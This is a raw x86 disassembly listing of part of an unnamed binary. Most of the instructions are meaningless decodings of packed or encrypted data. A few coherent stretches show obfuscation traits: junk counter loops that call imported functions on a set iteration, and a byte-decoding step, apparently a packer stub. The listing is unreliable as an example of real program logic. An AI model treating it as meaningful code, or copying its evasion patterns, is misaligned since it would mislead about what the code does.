  4062ed:	add    al,0x9a
  4062ef:	sub    eax,0x176cdb36
  4062f4:	pop    ss
  4062f5:	or     al,0x3a
  4062f7:	mov    edi,0x1273ef59
  4062fc:	jg     0x4062b2
  4062fe:	cmp    bh,BYTE PTR [ebx]
  406300:	jno    0x406319
  406302:	dec    ebx
  406303:	js     0x4062a5
  406305:	add    al,0xb6
  406307:	retf   0x7414
  40630a:	sub    BYTE PTR [esi],0xa2
  40630d:	lods   al,BYTE PTR es:[esi]
  40630f:	ret    0xa34
  406312:	sub    BYTE PTR [edi],ch
  406314:	xchg   DWORD PTR [edx-0x1b],ebp
  406317:	and    edi,0x7901710c
  40631d:	daa    
  40631e:	out    dx,al
  40631f:	fs aaa 
  406321:	lahf   
  406322:	stos   DWORD PTR es:[edi],eax
  406323:	xor    edx,ebp
  406325:	xchg   BYTE PTR [ebx-0x566aa0d5],ch
  40632b:	cmp    al,0x74
  40632d:	inc    ebx
  40632e:	add    eax,0x5f0a07c9
  406333:	enter  0xc2dd,0x2a
  406337:	xchg   edi,eax
  406338:	pusha  
  406339:	test   BYTE PTR [esi+eax*1+0xc],ch
  40633d:	mov    dl,0xc3
  40633f:	or     BYTE PTR [ecx+ecx*1-0x3b],ah
  406343:	push   edi
  406344:	(bad)  
  406345:	xor    edx,edx
  406347:	mov    al,ds:0xbcd9d049
  40634c:	pushf  
  40634d:	push   esi
  40634e:	mov    ds:0x8081709b,eax
  406353:	push   0x90aeeddf
  406358:	inc    ecx
  406359:	enter  0x349f,0x64
  40635d:	add    eax,DWORD PTR [ebx+0x34929244]
  406363:	inc    ecx
  406364:	sub    ebx,DWORD PTR [eax+0x5]
  406367:	cmp    eax,0xdcf2a0
  40636c:	test   al,0x25
  40636e:	in     eax,0x16
  406370:	lods   al,BYTE PTR ds:[esi]
  406371:	xor    BYTE PTR [ecx-0x49],dh
  406374:	mov    esp,?
  406376:	cmp    eax,0x58ebf7f2
  40637b:	sub    DWORD PTR [ebp+edx*2-0x1d],0xffffff8a
  406380:	jecxz  0x406333
  406382:	dec    esp
  406383:	iret   
  406384:	inc    ecx
  406385:	sbb    ah,dh
  406387:	fs (bad) 
  40638a:	mov    dh,0x4b
  40638c:	sub    DWORD PTR [edi+esi*4+0x71],edi
  406390:	mov    DWORD PTR [eax-0x6ead8f14],0x926c5a3
  40639a:	mov    ah,0xa
  40639c:	xchg   DWORD PTR [edx+0x17a1b89e],ecx
  4063a2:	pop    edx
  4063a3:	hlt    
  4063a4:	repz jmp 0x7a58:0x1b58a25f
  4063ac:	pusha  
  4063ad:	and    ch,bh
  4063af:	in     eax,0xc1
  4063b1:	(bad)  
  4063b2:	jge    0x40638a
  4063b4:	mov    ebx,0xffcb7296
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x8e0,0x19
  4063d1:	out    dx,eax
  4063d2:	xchg   ecx,eax
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063fc
  4063dc:	dec    edi
  4063dd:	test   al,0x4f
  4063df:	stos   BYTE PTR es:[edi],al
  4063e0:	inc    eax
  4063e1:	cld    
  4063e2:	das    
  4063e3:	add    DWORD PTR [esi],edi
  4063e5:	sti    
  4063e6:	jns    0x406398
  4063e8:	mov    esi,0xc86acf12
  4063ed:	push   edi
  4063ee:	adc    al,0x64
  4063f0:	xchg   sp,ax
  4063f2:	xchg   ecx,eax
  4063f3:	cmp    eax,0x96c97514
  4063f8:	mov    al,0xdd
  4063fa:	clc    
  4063fb:	sbb    edi,eax
  4063fd:	retf   
  4063fe:	scas   al,BYTE PTR es:[edi]
  4063ff:	mov    dh,0xcf
  406401:	push   ds
  406402:	dec    esi
  406403:	mov    bl,dl
  406405:	fxch   st(0)
  406407:	xor    cl,dl
  406409:	xchg   esi,eax
  40640a:	mov    edx,0x863794c6
  40640f:	add    BYTE PTR [edi+ebx*2-0x7c4fb2e6],dh
  406416:	or     dh,BYTE PTR [eax]
  406418:	outs   dx,DWORD PTR ds:[esi]
  406419:	retf   0xcb84
  40641c:	test   BYTE PTR [esi+edx*2-0x4d3de705],bh
  406423:	out    0xc2,eax
  406425:	sbb    DWORD PTR [edx+0x26740c11],edx
  40642b:	test   DWORD PTR [eax-0x3dafc6dc],0x10981962
  406435:	int3   
  406436:	push   esi
  406437:	sub    al,0xeb
  406439:	jecxz  0x4064ae
  40643b:	sbb    BYTE PTR [ecx-0x38],bh
  40643e:	ret    0xeba
  406441:	ret    0xa408
  406444:	std    
  406445:	xchg   esp,eax
  406446:	fs push edi
  406448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406449:	dec    cl
  40644b:	(bad)  
  40644c:	jns    0x4064bf
  40644e:	mov    ebp,0xd1daf587
  406453:	cmp    al,0x43
  406455:	repnz shr BYTE PTR gs:[edi-0x50],0x70
  40645b:	mov    ecx,0xe8b45cbf
  406460:	or     DWORD PTR [esi],ebx
  406462:	stos   BYTE PTR es:[edi],al
  406463:	mov    al,ds:0xb798227d
  406468:	sti    
  406469:	jg     0x4064a6
  40646b:	into   
  40646c:	int    0x10
  40646e:	adc    ch,BYTE PTR [edx-0x44fef46e]
  406474:	pop    ebx
  406475:	icebp  
  406476:	data16 and ch,BYTE PTR [esi+0x6f]
  40647a:	stc    
  40647b:	adc    eax,0xbb9bab48
  406480:	shl    BYTE PTR [edi-0x5f],cl
  406483:	(bad)  
  406485:	add    BYTE PTR [eax+0x41],dh
  406488:	xchg   edi,eax
  406489:	loop   0x40646e
  40648b:	ret    0x1274
  40648e:	jmp    0xc7a0:0xadb5b074
  406495:	test   eax,0x9e326b2c
  40649a:	push   0x5fee58aa
  40649f:	out    0x2d,al
  4064a1:	mov    dl,0xa4
  4064a3:	data16 ds cli 
  4064a6:	sbb    bh,BYTE PTR [edi+eax*1]
  4064a9:	jnp    0x4064bc
  4064ab:	pushf  
  4064ac:	xchg   edi,eax
  4064ad:	call   0xc4ac:0x71ccb615
  4064b4:	xchg   esi,eax
  4064b5:	call   0x1903e029
  4064ba:	pop    esp
  4064bb:	jne    0x406462
  4064bd:	xor    eax,0x13f3d51b
  4064c2:	sbb    ch,al
  4064c4:	test   al,0xb2
  4064c6:	hlt    
  4064c7:	rol    DWORD PTR [esp+esi*2+0x71e179f1],0xed
  4064cf:	inc    eax
  4064d0:	and    eax,ebx
  4064d2:	mov    cl,0x78
  4064d4:	xchg   esp,eax
  4064d5:	(bad)  
  4064d6:	repnz sub eax,0xa722105
  4064dc:	adc    al,0xd9
  4064de:	jmp    0xcca5:0x92096c77
  4064e5:	cmp    edi,0x5b45bfb5
  4064eb:	or     BYTE PTR [edx-0x73],dh
  4064ee:	inc    esi
  4064ef:	sub    al,0xd4
  4064f1:	fisttp QWORD PTR [ebx+0x174079c5]
  4064f7:	mov    ss,WORD PTR [edx]
  4064f9:	inc    esp
  4064fa:	mov    ebp,gs
  4064fc:	mov    fs,WORD PTR [eax-0x6f]
  4064ff:	scas   eax,DWORD PTR es:[edi]
  406500:	iret   
  406501:	gs pushw es
  406504:	jp     0x406525
  406506:	sub    DWORD PTR [ecx-0x4901eade],ecx
  40650c:	clc    
  40650d:	adc    DWORD PTR [eax+0x1b2860fb],ebx
  406513:	sbb    al,0x60
  406515:	ret    0x1078
  406518:	addr16 data16 add al,0x14
  40651c:	enter  0x2904,0x8d
  406520:	inc    ebx
  406521:	in     eax,dx
  406522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406523:	pop    ebp
  406524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406525:	int3   
  406526:	lahf   
  406527:	sbb    DWORD PTR [esi+0x5b],0x37b961fc
  40652e:	adc    BYTE PTR [edi+0x3dac2b08],0x7c
  406535:	cs int 0x8c
  406538:	inc    ebx
  406539:	(bad)  
  40653a:	mov    edi,0xfe3db08
  40653f:	add    al,0x91
  406541:	jns    0x406522
  406543:	lods   al,BYTE PTR ds:[esi]
  406544:	rcr    DWORD PTR [ebp-0x4a0c4caa],1
  40654a:	add    eax,0x3da4c935
  40654f:	repnz inc esp
  406551:	xchg   ecx,eax
  406552:	mov    edi,0xa5212dab
  406557:	xor    BYTE PTR [edi],dh
  406559:	bound  ecx,QWORD PTR [ebx+0xaf125e5]
  40655f:	jle    0x4065a8
  406561:	lea    eax,[edx+ecx*2-0x28]
  406565:	inc    eax
  406566:	push   0xfffffff9
  406568:	lods   eax,DWORD PTR gs:[esi]
  40656a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656b:	push   esp
  40656c:	hlt    
  40656d:	sub    eax,0x2af5d0d9
  406572:	mov    edx,0x121df8e7
  406577:	sbb    eax,0x67e109c4
  40657c:	in     eax,dx
  40657d:	dec    ebx
  40657e:	jnp    0x40659b
  406580:	scas   al,BYTE PTR es:[edi]
  406581:	ret    0x6ea5
  406584:	mov    bl,0x94
  406586:	or     BYTE PTR [eax+0x2b150c4b],cl
  40658c:	mov    eax,0xf12fdb23
  406591:	bound  ecx,QWORD PTR [ecx]
  406593:	mov    ah,0xb7
  406595:	frstor [ebx]
  406597:	xchg   esi,eax
  406598:	mov    bh,0x8c
  40659a:	mov    bh,0x8
  40659c:	cmp    DWORD PTR [ebx],esp
  40659e:	push   0x14
  4065a0:	fmul   QWORD PTR [edx+0x56]
  4065a3:	lahf   
  4065a4:	push   eax
  4065a5:	lea    eax,[ebx+eax*1+0x38]
  4065a9:	push   esi
  4065aa:	pop    es
  4065ab:	call   FWORD PTR [ebp-0x55431318]
  4065b1:	in     eax,dx
  4065b2:	dec    esp
  4065b3:	pop    edx
  4065b4:	push   edi
  4065b5:	pop    edi
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1-0x1607b022]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x40665f
  40660b:	outs   dx,DWORD PTR ds:[esi]
  40660c:	aam    0xa2
  40660e:	addr16 mov ebx,0x348aa9a5
  406614:	or     esp,DWORD PTR [ecx-0x37]
  406617:	adc    al,0xea
  406619:	push   ebx
  40661a:	ins    DWORD PTR es:[edi],dx
  40661b:	add    edi,eax
  40661d:	jns    0x4065dd
  40661f:	aad    0x5c
  406621:	adc    ebp,edx
  406623:	mov    al,ds:0xfdc38a6a
  406628:	cmp    ebp,DWORD PTR [ecx+0x58]
  40662b:	inc    ecx
  40662c:	call   0xa11cbb81
  406631:	repz jae 0x4065d2
  406634:	fstp   DWORD PTR [ebp+0x65610ead]
  40663a:	ds test al,0x74
  40663d:	inc    ebx
  40663e:	or     al,0xe6
  406640:	pop    ss
  406641:	mov    esi,0x3cacb94a
  406646:	shr    DWORD PTR [eax],1
  406648:	xor    al,0x8c
  40664a:	sbb    ah,0xd4
  40664d:	imul   edx,DWORD PTR [edi],0xffffffc4
  406650:	sti    
  406651:	(bad)  
  406652:	arpl   cx,di
  406654:	xor    ebx,esp
  406656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406657:	(bad)  
  406658:	popf   
  406659:	adc    eax,0x6afbbeba
  40665e:	or     bh,al
  406660:	aam    0xea
  406662:	pushf  
  406663:	sub    eax,0x6aad483a
  406668:	jno    0x4066e0
  40666a:	repz das 
  40666c:	ret    0x87d5
  40666f:	push   ebp
  406670:	xlat   BYTE PTR ds:[ebx]
  406671:	mov    eax,0xecfd45f6
  406676:	jmp    0x406621
  406678:	jae    0x406658
  40667a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40667b:	or     BYTE PTR [eax+0x3a571411],ch
  406681:	ret    
  406682:	jg     0x4066ee
  406684:	and    BYTE PTR [edx-0x43],0x4
  406688:	push   ss
  406689:	icebp  
  40668a:	mov    al,0x3a
  40668c:	adc    al,0x27
  40668e:	dec    ebp
  40668f:	xor    BYTE PTR [edx],dh
  406691:	add    BYTE PTR [esi-0x4c],cl
  406694:	(bad)  
  406695:	jmp    0x4066f0
  406697:	mov    ds:0x4f9571da,eax
  40669c:	mov    ebp,esi
  40669e:	pop    edi
  40669f:	jbe    0x406707
  4066a1:	jno    0x40668a
  4066a3:	loope  0x406691
  4066a5:	xor    BYTE PTR [eax-0x9],ah
  4066a8:	mov    fs,WORD PTR [eax-0x4e]
  4066ab:	int    0xbf
  4066ad:	(bad)  
  4066ae:	fisttp DWORD PTR [eax*1-0x5d098fac]
  4066b5:	mov    dl,BYTE PTR [edi-0x20]
  4066b8:	das    
  4066b9:	push   esp
  4066ba:	je     0x40673b
  4066bc:	cmp    dh,bh
  4066be:	and    al,bh
  4066c0:	add    dh,BYTE PTR [ebp+0x14]
  4066c3:	add    edi,DWORD PTR cs:[ebp+0x8b2c499]
  4066ca:	outs   dx,DWORD PTR ds:[esi]
  4066cb:	cmp    esi,DWORD PTR [edx+0x34]
  4066ce:	iret   
  4066cf:	or     dh,bh
  4066d1:	test   BYTE PTR [ecx+0x5cdcb8e4],bl
  4066d7:	jno    0x40673b
  4066d9:	addr16 in eax,0xa0
  4066dc:	sbb    DWORD PTR [edx+eax*1-0x69],edx
  4066e0:	imul   edi,DWORD PTR [eax-0x2b],0x60
  4066e4:	(bad)  
  4066e5:	xchg   ebp,eax
  4066e6:	and    eax,0x3038cd56
  4066eb:	jns    0x40670e
  4066ed:	add    dh,BYTE PTR [ebx+0x72108ec3]
  4066f3:	into   
  4066f4:	adc    eax,0x6ce59592
  4066f9:	sti    
  4066fa:	vpshaq ymm1,[ecx],xmm5
  4066ff:	cmp    DWORD PTR [edx+0x1c],0x5ee8144f
  406706:	inc    ebp
  406707:	push   ecx
  406708:	shl    DWORD PTR [eax-0x285fa9b3],cl
  40670e:	lods   eax,DWORD PTR ds:[esi]
  40670f:	sbb    DWORD PTR [edx-0x72],ebp
  406712:	sbb    ah,BYTE PTR [edi-0x81c2bc8]
  406718:	arpl   WORD PTR [edi-0x321ac208],bx
  40671e:	sar    ebx,1
  406720:	aaa    
  406721:	or     DWORD PTR [eax],ecx
  406723:	mov    edx,0xc71f3604
  406728:	es out 0x8d,eax
  40672b:	test   DWORD PTR [eax+0x7f],0x5b08d885
  406732:	fsub   DWORD PTR [edi+0x1e4de7ce]
  406738:	xlat   BYTE PTR ds:[ebx]
  406739:	cld    
  40673a:	call   0xa8774942
  40673f:	pop    edx
  406740:	push   eax
  406741:	shl    BYTE PTR [esi+esi*8],1
  406744:	je     0x406739
  406746:	mov    ds,WORD PTR [ecx-0x65]
  406749:	das    
  40674a:	(bad)  
  40674b:	push   ebx
  40674c:	and    edx,edx
  40674e:	cld    
  40674f:	cmp    DWORD PTR [ebp+eax*8-0x52f87581],0x1c
  406757:	getsec 
  406759:	fadd   DWORD PTR [eax-0x65]
  40675c:	sahf   
  40675d:	and    eax,0x87b07f96
  406762:	xchg   ecx,eax
  406763:	fstp   QWORD PTR [eax]
  406765:	push   cs
  406766:	iret   
  406767:	data16 addr16 cmp al,0x4f
  40676b:	xchg   esp,eax
  40676c:	sbb    al,0xa0
  40676e:	mov    bh,0xda
  406770:	(bad)  
  406771:	fimul  DWORD PTR [ebx+0x48227df6]
  406777:	inc    esi
  406778:	ror    BYTE PTR [ebp+0x16],0x33
  40677c:	imul   dh
  40677e:	retf   
  40677f:	faddp  st(1),st
  406781:	es retf 0x5d69
  406785:	pop    eax
  406786:	and    ah,bh
  406788:	out    0xd,eax
  40678a:	popf   
  40678b:	pop    ebx
  40678c:	call   0x990c5724
  406791:	pop    es
  406792:	(bad)  
  406793:	jae    0x40677d
  406795:	sub    BYTE PTR [ebx-0x19404b9d],cl
  40679b:	cmp    BYTE PTR [edx-0xc],dl
  40679e:	ret    
  40679f:	aaa    
  4067a0:	sbb    al,0x80
  4067a2:	jae    0x406728
  4067a4:	or     al,0xae
  4067a6:	and    DWORD PTR [eax-0x7a4094ef],esi
  4067ac:	or     ebp,DWORD PTR [esi+0x611473ef]
  4067b2:	push   0xffffffba
  4067b4:	(bad)  
  4067b5:	hlt    
  4067b6:	lock mov bh,0xcf
  4067b9:	aad    0xec
  4067bb:	shl    DWORD PTR ds:0xc8fe200e,cl
  4067c1:	push   edx
  4067c2:	icebp  
  4067c3:	test   DWORD PTR [eax-0x774ce173],edx
  4067c9:	xchg   DWORD PTR [ebx-0x6ec852f1],ebx
  4067cf:	jmp    0xc43d1cb9
  4067d4:	lahf   
  4067d5:	and    eax,0xc8968b24
  4067da:	xchg   esi,eax
  4067db:	std    
  4067dc:	xor    BYTE PTR [ecx+0x2a],dl
  4067df:	loopne 0x4067b0
  4067e1:	xor    bh,BYTE PTR [edi+0x46]
  4067e4:	(bad)  
  4067e6:	gs (bad) 
  4067e8:	int    0xff
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x916f:0x8a47f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	inc    esi
  406865:	ds pop ss
  406867:	(bad)  [esi-0x6c]
  40686a:	out    dx,al
  40686b:	out    0x6a,al
  40686d:	sbb    al,0xf4
  40686f:	stos   DWORD PTR es:[edi],eax
  406870:	adc    al,0xf
  406872:	out    0xec,eax
  406874:	cmp    ah,bh
  406876:	xchg   edx,eax
  406878:	sub    al,0xb
  40687a:	in     al,dx
  40687b:	mov    edx,0x1bf95271
  406880:	out    dx,eax
  406881:	mov    eax,ds:0xce34781b
  406886:	les    eax,FWORD PTR [ebx+0x8a3f0b]
  40688c:	cmp    BYTE PTR [eax+0x6d],dh
  40688f:	enter  0x1f8e,0x9e
  406893:	arpl   WORD PTR [ecx+esi*2-0x50],bx
  406897:	and    DWORD PTR [edx-0x13109bf2],edi
  40689d:	in     eax,dx
  40689e:	add    DWORD PTR [ebx-0x59],esp
  4068a1:	rol    DWORD PTR [esi+0x4c5d7076],0x38
  4068a8:	js     0x40682f
  4068aa:	dec    eax
  4068ab:	cmp    eax,0xa4d8fe6e
  4068b0:	lds    ebp,FWORD PTR [ebx]
  4068b2:	inc    ebx
  4068b3:	and    DWORD PTR [eax+0x25],esi
  4068b6:	fsubp  st(0),st
  4068b8:	mov    eax,0x8ff67e90
  4068bd:	mov    dh,0x4a
  4068bf:	and    DWORD PTR [esi+0x20e82e9a],eax
  4068c5:	icebp  
  4068c6:	or     eax,0xf3e8bc7d
  4068cb:	int3   
  4068cc:	xchg   DWORD PTR [eax],esi
  4068ce:	fs push eax
  4068d0:	inc    edi
  4068d1:	xchg   edx,eax
  4068d2:	sar    BYTE PTR [eax-0x5e],0xae
  4068d6:	jle    0x40687b
  4068d8:	add    cl,BYTE PTR [esi]
  4068da:	test   edx,ebx
  4068dc:	outs   dx,BYTE PTR ds:[esi]
  4068dd:	mov    WORD PTR [edi-0x57665e29],ds
  4068e3:	jmp    DWORD PTR [ebx+ebx*4+0x5c172db4]
  4068ea:	rcr    DWORD PTR [eax+0xb2cd714],1
  4068f0:	sub    dl,BYTE PTR [esi]
  4068f2:	mov    ah,0xdc
  4068f4:	and    eax,0xfb5a251a
  4068f9:	shl    DWORD PTR [eax+edx*4+0x52],cl
  4068fd:	retf   0x7745
  406900:	les    esi,FWORD PTR [eax+0x92ea043]
  406906:	push   ebx
  406907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406908:	xor    al,0xe7
  40690a:	mov    bl,0x14
  40690c:	mov    al,0xb5
  40690e:	mov    edi,0x85e45492
  406913:	sub    al,0x9d
  406915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406916:	aas    
  406917:	cli    
  406918:	in     eax,dx
  406919:	inc    ebx
  40691a:	jg     0x40697d
  40691c:	inc    ecx
  40691d:	into   
  40691e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40691f:	inc    esi
  406920:	(bad)  
  406921:	fsubp  st(3),st
  406923:	or     al,BYTE PTR [edx+0x442514c1]
  406929:	les    esi,FWORD PTR [edi-0x28981650]
  40692f:	sub    ch,cl
  406931:	sub    bl,bh
  406933:	sar    DWORD PTR [ebx-0x1cb2b49e],1
  406939:	dec    ebx
  40693a:	mov    ecx,0xf47b3238
  40693f:	jo     0x406975
  406941:	jbe    0x4068e9
  406943:	pop    edx
  406944:	mov    al,ds:0xcf728ea3
  406949:	dec    eax
  40694a:	aas    
  40694b:	push   eax
  40694c:	bound  esi,QWORD PTR [ecx+ecx*8-0x5f13bf88]
  406953:	inc    esi
  406954:	addr16 pop ebp
  406956:	ds inc esp
  406958:	xchg   edi,eax
  406959:	mov    ch,0xe9
  40695b:	in     al,0x24
  40695d:	pushf  
  40695e:	push   edi
  40695f:	(bad)  
  406960:	js     0x4068f5
  406962:	icebp  
  406963:	adc    ecx,ecx
  406965:	push   ebp
  406966:	cmp    edi,0x3ab93d67
  40696c:	in     eax,0xcf
  40696e:	out    dx,al
  40696f:	dec    edx
  406970:	fdiv   QWORD PTR [esp+edi*2-0x61]
  406974:	cli    
  406975:	add    al,0x22
  406977:	mul    BYTE PTR [edx]
  406979:	frstor [ecx]
  40697b:	inc    esi
  40697c:	lock imul ecx,DWORD PTR [esp+ebx*8-0x13fbd6b],0x25
  406985:	je     0x4069ae
  406987:	pop    eax
  406988:	pusha  
  406989:	rcr    BYTE PTR [edi],0x1
  40698c:	add    al,bh
  40698e:	stos   DWORD PTR es:[edi],eax
  40698f:	push   0x72
  406991:	pop    ebx
  406992:	ret    
  406993:	fsubr  QWORD PTR [ecx]
  406995:	mov    al,ds:0x298cade2
  40699a:	lods   al,BYTE PTR ds:[esi]
  40699b:	popaw  
  40699d:	cli    
  40699e:	retf   
  40699f:	lea    edx,[edi+eax*1+0x72fda12c]
  4069a6:	call   0x36a4d1a5
  4069ab:	xchg   dl,cl
  4069ad:	hlt    
  4069ae:	xchg   esi,eax
  4069af:	adc    al,cl
  4069b1:	aas    
  4069b2:	sbb    ah,BYTE PTR [eax]
  4069b4:	and    cl,BYTE PTR [ecx+0xf850087]
  4069ba:	ror    DWORD PTR ds:0x4df25199,1
  4069c0:	xor    dl,BYTE PTR [eax-0x359144a8]
  4069c6:	jl     0x4069de
  4069c8:	fisub  DWORD PTR [ecx+ebp*8-0x58]
  4069cc:	fst    DWORD PTR [esi+0x50]
  4069cf:	jae    0x406a4e
  4069d1:	add    al,0x94
  4069d3:	and    DWORD PTR [ecx+ebp*1],esp
  4069d6:	cli    
  4069d7:	dec    edi
  4069d8:	retf   0x46c6
  4069db:	fdivr  QWORD PTR [ebp-0x7c]
  4069de:	clc    
  4069df:	jecxz  0x40696f
  4069e1:	retf   0x976c
  4069e4:	sub    ebx,DWORD PTR [edi+0x27bb4199]
  4069ea:	(bad)  
  4069ec:	sbb    al,0x45
  4069ee:	xor    bh,ah
  4069f0:	shl    edx,0x12
  4069f3:	adc    DWORD PTR [edi],ebp
  4069f5:	adc    al,0x1d
  4069f7:	add    DWORD PTR ds:0x717eae63,ebx
  4069fd:	and    BYTE PTR [esi+0x2d001c3a],0xb2
  406a04:	retf   0x9536
  406a07:	pop    esi
  406a08:	arpl   WORD PTR [ebp+0x1e374d9a],bp
  406a0e:	pop    DWORD PTR [ecx+edx*2]
  406a11:	imul   ecx,DWORD PTR [ecx-0xde1a95e],0xf7572cfb
  406a1b:	test   DWORD PTR [ebp-0x52],edi
  406a1e:	dec    edx
  406a1f:	stos   DWORD PTR es:[edi],eax
  406a20:	add    ecx,DWORD PTR [esi]
  406a22:	inc    edx
  406a23:	sub    BYTE PTR [edx+0x2c963160],cl
  406a29:	aam    0x1d
  406a2b:	cvttps2pi mm7,QWORD PTR [eax+eax*2+0x3f]
  406a30:	fbld   TBYTE PTR [edi]
  406a32:	std    
  406a33:	dec    ebx
  406a34:	xchg   DWORD PTR [edx+esi*4],esp
  406a37:	jl     0x406a07
  406a39:	push   ebp
  406a3a:	ret    
  406a3b:	jbe    0x406a2d
  406a3d:	jmp    0x513fc315
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ece3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ece3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ece3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42eb1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ece3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ece3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4303e7
  406aa5:	xor    edi,DWORD PTR ds:0x430335
  406aab:	mov    DWORD PTR ds:0x4303e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43035d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43035d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43035d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43035d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e7b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42eb1f
  406af9:	cmp    DWORD PTR ds:0x43035d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4303df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4303df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4303df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e8df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4303df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4303df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430335,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4303d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4303d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4303d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4303d7,0x11
